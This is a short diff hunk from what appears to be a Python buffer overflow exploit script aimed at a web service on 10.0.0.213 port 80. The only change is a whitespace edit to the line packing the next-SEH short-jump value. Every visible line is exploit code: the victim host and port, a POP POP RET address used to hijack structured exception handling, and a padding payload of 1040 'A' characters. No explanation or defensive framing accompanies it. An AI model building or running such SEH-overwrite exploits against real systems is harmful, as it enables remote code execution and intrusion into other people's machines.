@@ -9,7 +9,7 @@ victim_host = "10.0.0.213"
 victim_port = 80
 
 
-nseh = pack ('<I', 0x909032EB) # Short jump 
+nseh = pack ('<I',0x909032EB) # Short jump 
 seh = pack('I',0x7c38a67f)	# POP POP RET
 
 exploit_payload  = "A" * 1040
